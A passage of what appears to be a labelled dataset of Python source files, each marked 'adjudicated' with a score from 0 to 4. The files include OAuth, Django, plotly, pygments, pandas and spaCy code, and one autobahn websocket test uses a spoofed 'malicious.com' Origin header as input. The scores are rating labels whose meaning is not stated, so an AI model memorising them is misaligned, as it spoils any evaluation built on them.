    Convert object to string representation, yielding the same result a `repr`
    but catches all exceptions and returns 'N/A' instead of raising the
    exception. Strings may be truncated by providing `clip`.

    >>> safe_repr(42)
    '42'
    >>> safe_repr('Clipped text', clip=8)
    'Clip..xt'
    >>> safe_repr([1,2,3,4], clip=8)
    '[1,2..4]'
    """"""
    try:
        s = repr(obj)
        if not clip or len(s) <= clip:
            return s
        else:
            return s[:clip - 4] + '..' + s[-2:]
    except:
        return 'N/A'


def trunc(obj: str, max: int, left: bool = False) -> str:
    """"""
    Convert `obj` to string, eliminate newlines and truncate the string to
    `max` characters. If there are more characters in the string add ``...`` to
    the string. With `left=True`, the string can be truncated at the beginning.

    @note: Does not catch exceptions when converting `obj` to string with
        `str`.

    >>> trunc('This is a long text.', 8)
    This ...
    >>> trunc('This is a long text.', 8, left=True)
    ...text.
    """"""
    s = str(obj)
    s = s.replace('\n', '|')
    if len(s) > max:
        if left:
            return '...' + s[len(s) - max + 3:]
        else:
            return s[:(max - 3)] + '...'
    else:
        return s


def pp(i: Union[int, float], base: int = 1024) -> str:
    """"""
    Pretty-print the integer `i` as a human-readable size representation.
    """"""
    degree = 0
    pattern = ""%4d     %s""
    while i > base:
        pattern = ""%7.2f %s""
        i = i / float(base)
        degree += 1
    scales = ['B', 'KB', 'MB', 'GB', 'TB', 'EB']
    return pattern % (i, scales[degree])


def pp_timestamp(t: Optional[float]) -> str:
    """"""
    Get a friendly timestamp represented as a string.
    """"""
    if t is None:
        return ''
    h, m, s = int(t / 3600), int(t / 60 % 60), t % 60
    return ""%02d:%02d:%05.2f"" % (h, m, s)"
517	adjudicated	4	"""""""
Kakao OAuth2 backend, docs at:
    https://python-social-auth.readthedocs.io/en/latest/backends/kakao.html
""""""
from .oauth import BaseOAuth2


class KakaoOAuth2(BaseOAuth2):
    """"""Kakao OAuth authentication backend""""""
    name = 'kakao'
    AUTHORIZATION_URL = 'https://kauth.kakao.com/oauth/authorize'
    ACCESS_TOKEN_URL = 'https://kauth.kakao.com/oauth/token'
    ACCESS_TOKEN_METHOD = 'POST'
    REDIRECT_STATE = False
    EXTRA_DATA = [
        ('properties', 'properties'),
    ]

    def get_user_id(self, details, response):
        return response['id']

    def get_user_details(self, response):
        """"""Return user details from Kakao account""""""

        kakao_account = response.get('kakao_account', '')
        kaccount_email = kakao_account.get('email', '')
        properties = response.get('properties', '')
        nickname = properties.get('nickname') if properties else ''
        return {
            'username': nickname,
            'email': kaccount_email,
            'fullname': nickname,
            'first_name': nickname[1:] if nickname else '',
            'last_name': nickname[0] if nickname else '',
        }

    def user_data(self, access_token, *args, **kwargs):
        """"""Loads user data from service""""""
        return self.get_json(
            'https://kapi.kakao.com/v2/user/me',
            headers={
                'Authorization': f'Bearer {access_token}',
                'Content_Type': 'application/x-www-form-urlencoded;charset=utf-8',
            },
            params={'access_token': access_token}
        )

    def auth_complete_params(self, state=None):
        client_id, client_secret = self.get_key_and_secret()
        return {
            'grant_type': 'authorization_code',
            'code': self.data.get('code', ''),
            'client_id': client_id,
            'client_secret': client_secret,
        }"
463	adjudicated	2	"from contextlib import contextmanager
import os
import tempfile

import pytest

from pandas.io.pytables import HDFStore

tables = pytest.importorskip(""tables"")
# set these parameters so we don't have file sharing
tables.parameters.MAX_NUMEXPR_THREADS = 1
tables.parameters.MAX_BLOSC_THREADS = 1
tables.parameters.MAX_THREADS = 1


def safe_remove(path):
    if path is not None:
        try:
            os.remove(path)  # noqa: PDF008
        except OSError:
            pass


def safe_close(store):
    try:
        if store is not None:
            store.close()
    except OSError:
        pass


def create_tempfile(path):
    """"""create an unopened named temporary file""""""
    return os.path.join(tempfile.gettempdir(), path)


# contextmanager to ensure the file cleanup
@contextmanager
def ensure_clean_store(path, mode=""a"", complevel=None, complib=None, fletcher32=False):

    try:

        # put in the temporary path if we don't have one already
        if not len(os.path.dirname(path)):
            path = create_tempfile(path)

        store = HDFStore(
            path, mode=mode, complevel=complevel, complib=complib, fletcher32=False
        )
        yield store
    finally:
        safe_close(store)
        if mode == ""w"" or mode == ""a"":
            safe_remove(path)


@contextmanager
def ensure_clean_path(path):
    """"""
    return essentially a named temporary file that is not opened
    and deleted on exiting; if path is a list, then create and
    return list of filenames
    """"""
    try:
        if isinstance(path, list):
            filenames = [create_tempfile(p) for p in path]
            yield filenames
        else:
            filenames = [create_tempfile(path)]
            yield filenames[0]
    finally:
        for f in filenames:
            safe_remove(f)


def _maybe_remove(store, key):
    """"""
    For tests using tables, try removing the table to be sure there is
    no content from previous tests using the same table name.
    """"""
    try:
        store.remove(key)
    except (ValueError, KeyError):
        pass"
432	adjudicated	0	"from __future__ import absolute_import

from django import VERSION as django_version
from django import forms
from django.conf import settings
from django.utils.encoding import force_text
from django.utils.safestring import mark_safe
from django.utils.html import format_html

from .utils import get_icon_choices

CHOICES = get_icon_choices()

class IconWidget(forms.Select):

    def __init__(self, attrs=None):
        super(IconWidget, self).__init__(attrs, choices=CHOICES)

    if django_version >= (1, 11):
        def create_option(self, name, value, label, selected, index, subindex=None, attrs=None):
            option = super(IconWidget, self).create_option(name, value, label, selected, index, subindex=subindex, attrs=attrs)
            option[""attrs""][""data-icon""] = value
            return option
    else:
        def render_option(self, selected_choices, option_value, option_label):
            if option_value is None:
                option_value = ''
            option_value = force_text(option_value)
            if option_value in selected_choices:
                selected_html = mark_safe(' selected=""selected""')
                if not self.allow_multiple_selected:
                    # Only allow for a single selection.
                    selected_choices.remove(option_value)
            else:
                selected_html = ''
            return format_html('<option data-icon=""{0}"" value=""{0}""{1}>{2}</option>',
                option_value,
                selected_html,
                force_text(option_label),
            )

    class Media:

        js = (
            'fontawesome/js/django_fontawesome.js',
            'fontawesome/select2/select2.min.js'
        )

        css = {
            'all': (
                getattr(settings, 'FONTAWESOME_CSS_URL', 'fontawesome/css/font-awesome.min.css'),
                'fontawesome/select2/select2.css',
                'fontawesome/select2/select2-bootstrap.css'
            )
        }"
490	adjudicated	2	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""sankey.node.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
481	adjudicated	2	"""""""
This module includes some utility functions for inspecting the layout
of a GDAL data source -- the functionality is analogous to the output
produced by the `ogrinfo` utility.
""""""

from django.contrib.gis.gdal import DataSource
from django.contrib.gis.gdal.geometries import GEO_CLASSES


def ogrinfo(data_source, num_features=10):
    """"""
    Walk the available layers in the supplied `data_source`, displaying
    the fields for the first `num_features` features.
    """"""

    # Checking the parameters.
    if isinstance(data_source, str):
        data_source = DataSource(data_source)
    elif isinstance(data_source, DataSource):
        pass
    else:
        raise Exception(
            ""Data source parameter must be a string or a DataSource object.""
        )

    for i, layer in enumerate(data_source):
        print(""data source : %s"" % data_source.name)
        print(""==== layer %s"" % i)
        print(""  shape type: %s"" % GEO_CLASSES[layer.geom_type.num].__name__)
        print(""  # features: %s"" % len(layer))
        print(""         srs: %s"" % layer.srs)
        extent_tup = layer.extent.tuple
        print(""      extent: %s - %s"" % (extent_tup[0:2], extent_tup[2:4]))
        print(""Displaying the first %s features ===="" % num_features)

        width = max(*map(len, layer.fields))
        fmt = "" %%%ss: %%s"" % width
        for j, feature in enumerate(layer[:num_features]):
            print(""=== Feature %s"" % j)
            for fld_name in layer.fields:
                type_name = feature[fld_name].type_name
                output = fmt % (fld_name, type_name)
                val = feature.get(fld_name)
                if val:
                    if isinstance(val, str):
                        val_fmt = ' (""%s"")'
                    else:
                        val_fmt = "" (%s)""
                    output += val_fmt % val
                else:
                    output += "" (None)""
                print(output)"
423	adjudicated	0	"import os
import asyncio
import pytest

import txaio

# because py.test tries to collect it as a test-case
from unittest.mock import Mock

from autobahn.asyncio.websocket import WebSocketServerFactory


async def echo_async(what, when):
    await asyncio.sleep(when)
    return what


@pytest.mark.skipif(not os.environ.get('USE_ASYNCIO', False), reason='test runs on asyncio only')
@pytest.mark.asyncio
async def test_echo_async():
    assert 'Hello!' == await echo_async('Hello!', 0)


# @pytest.mark.asyncio(forbid_global_loop=True)
@pytest.mark.skipif(not os.environ.get('USE_ASYNCIO', False), reason='test runs on asyncio only')
def test_websocket_custom_loop(event_loop):
    factory = WebSocketServerFactory(loop=event_loop)
    server = factory()
    transport = Mock()
    server.connection_made(transport)


@pytest.mark.skipif(not os.environ.get('USE_ASYNCIO', False), reason='test runs on asyncio only')
@pytest.mark.asyncio
async def test_async_on_connect_server(event_loop):

    num = 42
    done = txaio.create_future()
    values = []

    async def foo(x):
        await asyncio.sleep(1)
        return x * x

    async def on_connect(req):
        v = await foo(num)
        values.append(v)
        txaio.resolve(done, req)

    factory = WebSocketServerFactory()
    server = factory()
    server.onConnect = on_connect
    transport = Mock()

    server.connection_made(transport)
    server.data = b'\r\n'.join([
        b'GET /ws HTTP/1.1',
        b'Host: www.example.com',
        b'Sec-WebSocket-Version: 13',
        b'Origin: http://www.example.com.malicious.com',
        b'Sec-WebSocket-Extensions: permessage-deflate',
        b'Sec-WebSocket-Key: tXAxWFUqnhi86Ajj7dRY5g==',
        b'Connection: keep-alive, Upgrade',
        b'Upgrade: websocket',
        b'\r\n',  # last string doesn't get a \r\n from join()
    ])
    server.processHandshake()
    await done

    assert len(values) == 1
    assert values[0] == num * num"
472	adjudicated	2	"""""""
 The GeometryColumns and SpatialRefSys models for the SpatiaLite backend.
""""""
from django.contrib.gis.db.backends.base.models import SpatialRefSysMixin
from django.db import models


class SpatialiteGeometryColumns(models.Model):
    """"""
    The 'geometry_columns' table from SpatiaLite.
    """"""

    f_table_name = models.CharField(max_length=256)
    f_geometry_column = models.CharField(max_length=256)
    coord_dimension = models.IntegerField()
    srid = models.IntegerField(primary_key=True)
    spatial_index_enabled = models.IntegerField()
    type = models.IntegerField(db_column=""geometry_type"")

    class Meta:
        app_label = ""gis""
        db_table = ""geometry_columns""
        managed = False

    def __str__(self):
        return ""%s.%s - %dD %s field (SRID: %d)"" % (
            self.f_table_name,
            self.f_geometry_column,
            self.coord_dimension,
            self.type,
            self.srid,
        )

    @classmethod
    def table_name_col(cls):
        """"""
        Return the name of the metadata column used to store the feature table
        name.
        """"""
        return ""f_table_name""

    @classmethod
    def geom_col_name(cls):
        """"""
        Return the name of the metadata column used to store the feature
        geometry column.
        """"""
        return ""f_geometry_column""


class SpatialiteSpatialRefSys(models.Model, SpatialRefSysMixin):
    """"""
    The 'spatial_ref_sys' table from SpatiaLite.
    """"""

    srid = models.IntegerField(primary_key=True)
    auth_name = models.CharField(max_length=256)
    auth_srid = models.IntegerField()
    ref_sys_name = models.CharField(max_length=256)
    proj4text = models.CharField(max_length=2048)
    srtext = models.CharField(max_length=2048)

    class Meta:
        app_label = ""gis""
        db_table = ""spatial_ref_sys""
        managed = False

    @property
    def wkt(self):
        return self.srtext"
506	adjudicated	3	"""""""
    pygments.styles.trac
    ~~~~~~~~~~~~~~~~~~~~

    Port of the default trac highlighter design.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.style import Style
from pygments.token import Keyword, Name, Comment, String, Error, \
     Number, Operator, Generic, Whitespace


class TracStyle(Style):
    """"""
    Port of the default trac highlighter design.
    """"""

    styles = {
        Whitespace:             '#bbbbbb',
        Comment:                'italic #999988',
        Comment.Preproc:        'bold noitalic #999999',
        Comment.Special:        'bold #999999',

        Operator:               'bold',

        String:                 '#bb8844',
        String.Regex:           '#808000',

        Number:                 '#009999',

        Keyword:                'bold',
        Keyword.Type:           '#445588',

        Name.Builtin:           '#999999',
        Name.Function:          'bold #990000',
        Name.Class:             'bold #445588',
        Name.Exception:         'bold #990000',
        Name.Namespace:         '#555555',
        Name.Variable:          '#008080',
        Name.Constant:          '#008080',
        Name.Tag:               '#000080',
        Name.Attribute:         '#008080',
        Name.Entity:            '#800080',

        Generic.Heading:        '#999999',
        Generic.Subheading:     '#aaaaaa',
        Generic.Deleted:        'bg:#ffdddd #000000',
        Generic.Inserted:       'bg:#ddffdd #000000',
        Generic.Error:          '#aa0000',
        Generic.Emph:           'italic',
        Generic.Strong:         'bold',
        Generic.Prompt:         '#555555',
        Generic.Output:         '#888888',
        Generic.Traceback:      '#aa0000',

        Error:                  'bg:#e3d2d2 #a61717'
    }"
446	adjudicated	1	"#!/usr/bin/env python3

import re

from homeassistant.components.binary_sensor import BinarySensorDeviceClass
from homeassistant.components.button import ButtonDeviceClass
from homeassistant.components.cover import CoverDeviceClass
from homeassistant.components.number import NumberDeviceClass
from homeassistant.components.sensor import SensorDeviceClass
from homeassistant.components.switch import SwitchDeviceClass

BLOCKLIST = (
    # requires special support on HA side
    ""enum"",
)

DOMAINS = {
    ""binary_sensor"": BinarySensorDeviceClass,
    ""button"": ButtonDeviceClass,
    ""cover"": CoverDeviceClass,
    ""number"": NumberDeviceClass,
    ""sensor"": SensorDeviceClass,
    ""switch"": SwitchDeviceClass,
}


def sub(path, pattern, repl):
    with open(path, ""r"") as handle:
        content = handle.read()
    content = re.sub(pattern, repl, content, flags=re.MULTILINE, count=1)
    with open(path, ""w"") as handle:
        handle.write(content)


def main():
    classes = {""EMPTY"": """"}
    allowed = {}

    for domain, enum in DOMAINS.items():
        available = {
            cls.value.upper(): cls.value for cls in enum if cls.value not in BLOCKLIST
        }

        classes.update(available)
        allowed[domain] = list(available.keys()) + [""EMPTY""]

    # replace constant defines in const.py
    out = """"
    for cls in sorted(classes):
        out += f'DEVICE_CLASS_{cls.upper()} = ""{classes[cls]}""\n'
    sub(""esphome/const.py"", '(DEVICE_CLASS_\w+ = ""\w*""\r?\n)+', out)

    for domain in sorted(allowed):
        # replace imports
        out = """"
        for item in sorted(allowed[domain]):
            out += f""    DEVICE_CLASS_{item.upper()},\n""

        sub(
            f""esphome/components/{domain}/__init__.py"",
            ""(    DEVICE_CLASS_\w+,\r?\n)+"",
            out,
        )


if __name__ == ""__main__"":
    main()"
417	adjudicated	0	"import pytest
from spacy.lang.en import English
from spacy.training import Example
from thinc.api import Config

default_tok2vec_config = """"""
[model]
@architectures = ""spacy-legacy.HashEmbedCNN.v1""
pretrained_vectors = null
width = 96
depth = 4
embed_size = 2000
window_size = 1
maxout_pieces = 3
subword_features = true
""""""
DEFAULT_TOK2VEC_MODEL = Config().from_str(default_tok2vec_config)[""model""]

TRAIN_DATA = [
    (
        ""They trade mortgage-backed securities."",
        {
            ""heads"": [1, 1, 4, 4, 5, 1, 1],
            ""deps"": [""nsubj"", ""ROOT"", ""compound"", ""punct"", ""nmod"", ""dobj"", ""punct""],
        },
    ),
    (
        ""I like London and Berlin."",
        {
            ""heads"": [1, 1, 1, 2, 2, 1],
            ""deps"": [""nsubj"", ""ROOT"", ""dobj"", ""cc"", ""conj"", ""punct""],
        },
    ),
]


@pytest.mark.parametrize(
    ""parser_config"",
    [
        {
            ""@architectures"": ""spacy-legacy.TransitionBasedParser.v1"",
            ""state_type"": ""parser"",
            ""extra_state_tokens"": False,
            ""hidden_width"": 66,
            ""maxout_pieces"": 2,
            ""use_upper"": True,
            ""tok2vec"": DEFAULT_TOK2VEC_MODEL,
        }
    ],
)
def test_parser(parser_config):
    pipe_config = {""model"": parser_config}
    nlp = English()
    parser = nlp.add_pipe(""parser"", config=pipe_config)
    train_examples = []
    for text, annotations in TRAIN_DATA:
        train_examples.append(Example.from_dict(nlp.make_doc(text), annotations))
        for dep in annotations.get(""deps"", []):
            if dep is not None:
                parser.add_label(dep)
    optimizer = nlp.initialize(get_examples=lambda: train_examples)
    for i in range(150):
        losses = {}
        nlp.update(train_examples, sgd=optimizer, losses=losses)
    assert losses[""parser""] < 0.0001"
188	adjudicated	2	"""""""
 The GeometryColumns and SpatialRefSys models for the SpatiaLite backend.
""""""
from django.contrib.gis.db.backends.base.models import SpatialRefSysMixin
from django.db import models


class SpatialiteGeometryColumns(models.Model):
    """"""
    The 'geometry_columns' table from SpatiaLite.
    """"""

    f_table_name = models.CharField(max_length=256)
    f_geometry_column = models.CharField(max_length=256)
    coord_dimension = models.IntegerField()
    srid = models.IntegerField(primary_key=True)
    spatial_index_enabled = models.IntegerField()
    type = models.IntegerField(db_column=""geometry_type"")

    class Meta:
        app_label = ""gis""
        db_table = ""geometry_columns""
        managed = False

    def __str__(self):
        return ""%s.%s - %dD %s field (SRID: %d)"" % (
            self.f_table_name,
            self.f_geometry_column,
            self.coord_dimension,
            self.type,
            self.srid,
        )

    @classmethod
    def table_name_col(cls):
        """"""
        Return the name of the metadata column used to store the feature table
        name.
        """"""
        return ""f_table_name""

    @classmethod
    def geom_col_name(cls):
        """"""
        Return the name of the metadata column used to store the feature
        geometry column.
        """"""
        return ""f_geometry_column""


class SpatialiteSpatialRefSys(models.Model, SpatialRefSysMixin):
    """"""
    The 'spatial_ref_sys' table from SpatiaLite.
    """"""

    srid = models.IntegerField(primary_key=True)
    auth_name = models.CharField(max_length=256)
    auth_srid = models.IntegerField()
    ref_sys_name = models.CharField(max_length=256)
    proj4text = models.CharField(max_length=2048)
    srtext = models.CharField(max_length=2048)

    class Meta:
        app_label = ""gis""
        db_table = ""spatial_ref_sys""
        managed = False

    @property
    def wkt(self):
        return self.srtext"
219	adjudicated	2	"from django.conf import settings
from django.utils.translation import get_supported_language_variant
from django.utils.translation.trans_real import language_code_re

from . import Error, Tags, register

E001 = Error(
    ""You have provided an invalid value for the LANGUAGE_CODE setting: {!r}."",
    id=""translation.E001"",
)

E002 = Error(
    ""You have provided an invalid language code in the LANGUAGES setting: {!r}."",
    id=""translation.E002"",
)

E003 = Error(
    ""You have provided an invalid language code in the LANGUAGES_BIDI setting: {!r}."",
    id=""translation.E003"",
)

E004 = Error(
    ""You have provided a value for the LANGUAGE_CODE setting that is not in ""
    ""the LANGUAGES setting."",
    id=""translation.E004"",
)


@register(Tags.translation)
def check_setting_language_code(app_configs, **kwargs):
    """"""Error if LANGUAGE_CODE setting is invalid.""""""
    tag = settings.LANGUAGE_CODE
    if not isinstance(tag, str) or not language_code_re.match(tag):
        return [Error(E001.msg.format(tag), id=E001.id)]
    return []


@register(Tags.translation)
def check_setting_languages(app_configs, **kwargs):
    """"""Error if LANGUAGES setting is invalid.""""""
    return [
        Error(E002.msg.format(tag), id=E002.id)
        for tag, _ in settings.LANGUAGES
        if not isinstance(tag, str) or not language_code_re.match(tag)
    ]


@register(Tags.translation)
def check_setting_languages_bidi(app_configs, **kwargs):
    """"""Error if LANGUAGES_BIDI setting is invalid.""""""
    return [
        Error(E003.msg.format(tag), id=E003.id)
        for tag in settings.LANGUAGES_BIDI
        if not isinstance(tag, str) or not language_code_re.match(tag)
    ]


@register(Tags.translation)
def check_language_settings_consistent(app_configs, **kwargs):
    """"""Error if language settings are not consistent with each other.""""""
    try:
        get_supported_language_variant(settings.LANGUAGE_CODE)
    except LookupError:
        return [E004]
    else:
        return []"
359	adjudicated	1	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is mozilla.org code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 1998
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .chardistribution import EUCKRDistributionAnalysis
from .codingstatemachine import CodingStateMachine
from .mbcharsetprober import MultiByteCharSetProber
from .mbcssm import CP949_SM_MODEL


class CP949Prober(MultiByteCharSetProber):
    def __init__(self):
        super(CP949Prober, self).__init__()
        self.coding_sm = CodingStateMachine(CP949_SM_MODEL)
        # NOTE: CP949 is a superset of EUC-KR, so the distribution should be
        #       not different.
        self.distribution_analyzer = EUCKRDistributionAnalysis()
        self.reset()

    @property
    def charset_name(self):
        return ""CP949""

    @property
    def language(self):
        return ""Korean"""
248	adjudicated	1	"# coding: utf8
from __future__ import unicode_literals
import numpy

from ... import describe
from .model import Model
from ...describe import Dimension, Synapses, Biases, Gradient


def _set_dimensions_if_needed(model, X, y=None):
    if model.nI is None:
        model.nI = X.shape[1]
    if model.nO is None and y is not None:
        if len(y.shape) == 2:
            model.nO = y.shape[1]
        else:
            model.nO = int(y.max()) + 1


@describe.on_data(_set_dimensions_if_needed)
@describe.attributes(
    nB=Dimension(""Batch size""),
    nI=Dimension(""Input size""),
    nO=Dimension(""Output size""),
    W=Synapses(
        ""Weights matrix"",
        lambda obj: (obj.nO, obj.nI),
        lambda W, ops: ops.xavier_uniform_init(W),
    ),
    b=Biases(""Bias vector"", lambda obj: (obj.nO,)),
    d_W=Gradient(""W""),
    d_b=Gradient(""b""),
)
class Mish(Model):
    """"""Dense layer with mish activation.
    
    https://arxiv.org/pdf/1908.08681.pdf
    """"""
    name = ""mish""

    @property
    def input_shape(self):
        return (self.nB, self.nI)

    @property
    def output_shape(self):
        return (self.nB, self.nO)

    def __init__(self, nO=None, nI=None, **kwargs):
        Model.__init__(self, **kwargs)
        self.nO = nO
        self.nI = nI
        self.drop_factor = kwargs.get(""drop_factor"", 1.0)

    def predict(self, X):
        Y = self.ops.affine(self.W, self.b, X)
        Y = self.ops.mish(Y)
        return Y

    def begin_update(self, X, drop=0.0):
        if drop is None:
            return self.predict(X), None
        Y1 = self.ops.affine(self.W, self.b, X)
        Y2 = self.ops.mish(Y1)
        drop *= self.drop_factor
        Y3, bp_dropout = self.ops.dropout(Y2, drop)

        def finish_update(dY2, sgd=None):
            dY1 = self.ops.backprop_mish(dY2, Y1)
            self.ops.gemm(dY1, X, trans1=True, out=self.d_W)
            self.d_b += dY1.sum(axis=0)
            dX = self.ops.gemm(dY1, self.W)
            if sgd is not None:
                sgd(self._mem.weights, self._mem.gradient, key=self.id)
            return dX

        return Y3, bp_dropout(finish_update)"
99	adjudicated	2	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""treemap"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
308	adjudicated	2	"""""""
    pygments.lexers.jmespath
    ~~~~~~~~~~~~~~~~~~~~~~~~

    Lexers for the JMESPath language

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.lexer import RegexLexer, bygroups, include
from pygments.token import String, Punctuation, Whitespace, Name, Operator, \
    Number, Literal, Keyword

__all__ = ['JMESPathLexer']


class JMESPathLexer(RegexLexer):
    """"""
    For JMESPath queries.
    """"""
    name = 'JMESPath'
    url = 'https://jmespath.org'
    filenames = ['*.jp']
    aliases = ['jmespath', 'jp']

    tokens = {
        'string': [
            (r""'(\\(.|\n)|[^'\\])*'"", String),
        ],
        'punctuation': [
            (r'(\[\?|[\.\*\[\],:\(\)\{\}\|])', Punctuation),
        ],
        'ws': [
            (r"" |\t|\n|\r"", Whitespace)
        ],
        ""dq-identifier"": [
            (r'[^\\""]+', Name.Variable),
            (r'\\""', Name.Variable),
            (r'.', Punctuation, '#pop'),
        ],
        'identifier': [
            (r'(&)?("")', bygroups(Name.Variable, Punctuation), 'dq-identifier'),
            (r'("")?(&?[A-Za-z][A-Za-z0-9_-]*)("")?', bygroups(Punctuation, Name.Variable, Punctuation)),
        ],
        'root': [
            include('ws'),
            include('string'),
            (r'(==|!=|<=|>=|<|>|&&|\|\||!)', Operator),
            include('punctuation'),
            (r'@', Name.Variable.Global),
            (r'(&?[A-Za-z][A-Za-z0-9_]*)(\()', bygroups(Name.Function, Punctuation)),
            (r'(&)(\()', bygroups(Name.Variable, Punctuation)),
            include('identifier'),
            (r'-?\d+', Number),
            (r'`', Literal, 'literal'),
        ],
        'literal': [
            include('ws'),
            include('string'),
            include('punctuation'),
            (r'(false|true|null)\b', Keyword.Constant),
            include('identifier'),
            (r'-?\d+\.?\d*([eE][-+]\d+)?', Number),
            (r'\\`', Literal),
            (r'`', Literal, '#pop'),
        ]
    }"
318	adjudicated	3	"""""""
    pygments.lexers.graphviz
    ~~~~~~~~~~~~~~~~~~~~~~~~

    Lexer for the DOT language (graphviz).

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.lexer import RegexLexer, bygroups
from pygments.token import Comment, Keyword, Operator, Name, String, Number, \
    Punctuation, Whitespace


__all__ = ['GraphvizLexer']


class GraphvizLexer(RegexLexer):
    """"""
    For graphviz DOT graph description language.

    .. versionadded:: 2.8
    """"""
    name = 'Graphviz'
    url = 'https://www.graphviz.org/doc/info/lang.html'
    aliases = ['graphviz', 'dot']
    filenames = ['*.gv', '*.dot']
    mimetypes = ['text/x-graphviz', 'text/vnd.graphviz']
    tokens = {
        'root': [
            (r'\s+', Whitespace),
            (r'(#|//).*?$', Comment.Single),
            (r'/(\\\n)?[*](.|\n)*?[*](\\\n)?/', Comment.Multiline),
            (r'(?i)(node|edge|graph|digraph|subgraph|strict)\b', Keyword),
            (r'--|->', Operator),
            (r'[{}[\]:;,]', Punctuation),
            (r'(\b\D\w*)(\s*)(=)(\s*)',
                bygroups(Name.Attribute, Whitespace, Punctuation, Whitespace),
                'attr_id'),
            (r'\b(n|ne|e|se|s|sw|w|nw|c|_)\b', Name.Builtin),
            (r'\b\D\w*', Name.Tag),  # node
            (r'[-]?((\.[0-9]+)|([0-9]+(\.[0-9]*)?))', Number),
            (r'""(\\""|[^""])*?""', Name.Tag),  # quoted node
            (r'<', Punctuation, 'xml'),
        ],
        'attr_id': [
            (r'\b\D\w*', String, '#pop'),
            (r'[-]?((\.[0-9]+)|([0-9]+(\.[0-9]*)?))', Number, '#pop'),
            (r'""(\\""|[^""])*?""', String.Double, '#pop'),
            (r'<', Punctuation, ('#pop', 'xml')),
        ],
        'xml': [
            (r'<', Punctuation, '#push'),
            (r'>', Punctuation, '#pop'),
            (r'\s+', Whitespace),
            (r'[^<>\s]', Name.Tag),
        ]
    }"
89	adjudicated	0	"import sys
from typing import TYPE_CHECKING

if sys.version_info < (3, 7) or TYPE_CHECKING:
    from ._yanchor import YanchorValidator
    from ._y import YValidator
    from ._xanchor import XanchorValidator
    from ._x import XValidator
    from ._visible import VisibleValidator
    from ._type import TypeValidator
    from ._templateitemname import TemplateitemnameValidator
    from ._showactive import ShowactiveValidator
    from ._pad import PadValidator
    from ._name import NameValidator
    from ._font import FontValidator
    from ._direction import DirectionValidator
    from ._buttondefaults import ButtondefaultsValidator
    from ._buttons import ButtonsValidator
    from ._borderwidth import BorderwidthValidator
    from ._bordercolor import BordercolorValidator
    from ._bgcolor import BgcolorValidator
    from ._active import ActiveValidator
else:
    from _plotly_utils.importers import relative_import

    __all__, __getattr__, __dir__ = relative_import(
        __name__,
        [],
        [
            ""._yanchor.YanchorValidator"",
            ""._y.YValidator"",
            ""._xanchor.XanchorValidator"",
            ""._x.XValidator"",
            ""._visible.VisibleValidator"",
            ""._type.TypeValidator"",
            ""._templateitemname.TemplateitemnameValidator"",
            ""._showactive.ShowactiveValidator"",
            ""._pad.PadValidator"",
            ""._name.NameValidator"",
            ""._font.FontValidator"",
            ""._direction.DirectionValidator"",
            ""._buttondefaults.ButtondefaultsValidator"",
            ""._buttons.ButtonsValidator"",
            ""._borderwidth.BorderwidthValidator"",
